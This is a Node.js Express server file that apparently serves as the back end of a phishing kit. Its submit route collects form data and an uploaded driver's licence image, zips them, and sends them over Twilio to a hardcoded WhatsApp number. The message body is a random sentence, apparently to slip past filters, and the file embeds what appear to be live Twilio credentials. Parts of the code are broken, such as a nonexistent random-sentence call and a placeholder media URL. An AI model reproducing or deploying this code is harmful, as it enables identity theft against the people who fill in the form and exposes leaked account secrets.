const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const multer = require("multer");
const zipFolder = require("zip-a-folder");
const compromise = require("compromise");
const twilio = require("twilio");

// Generate a random sentence for the email body
const randomSentence = compromise("i").random().sentences(1).out();

// Generate a random sentence for the email subject
const randomSubject = compromise("i").random().sentences(1).out();

const port = 9000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Set up file upload using multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});

const upload = multer({ storage: storage });

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
  try {
    const data = req.body;

    // validate data
    if (!data || typeof data !== "object") {
      throw new Error("Invalid data.");
    }

    // create a folder to store the message data
    const folderName = `message-${Date.now()}`;
    fs.mkdirSync(folderName);

    // save the message data to a text file
    const dataFileName = path.join(folderName, "happy.txt");
    fs.writeFileSync(dataFileName, JSON.stringify(data));

    // save the uploaded file to the folder
    const uploadedFileName = path.join(folderName, req.file.originalname);
    fs.copyFileSync(req.file.path, uploadedFileName);

    // create a password-protected zip file of the folder
    const zipFileName = "happy.zip";
    const password = "1234";
    await zipFolder.zip(folderName, zipFileName, password);

    // Twilio integration - create a Twilio client object
    const client = twilio('ACe54e344198f142962f26f8dbbb56bcdc', 'd121c459858a2071e48667eddf9d2209');

    // send message to recipient's WhatsApp
    await client.messages.create({
      from: 'whatsapp:+14155238886', // Twilio phone number
      to: 'whatsapp:+2349154911424', // recipient's WhatsApp number
      body: `${randomSentence}`,
      mediaUrl: `https://your-server.com/${zipFileName}`,
    });

    console.log("Message sent successfully.");

    // remove the folder and zip file
    fs.unlinkSync(zipFileName);
    fs.rmdirSync(folderName, { recursive: true });

    res.sendFile(path.join(__dirname, "confirmation.html"));
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending message.");
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
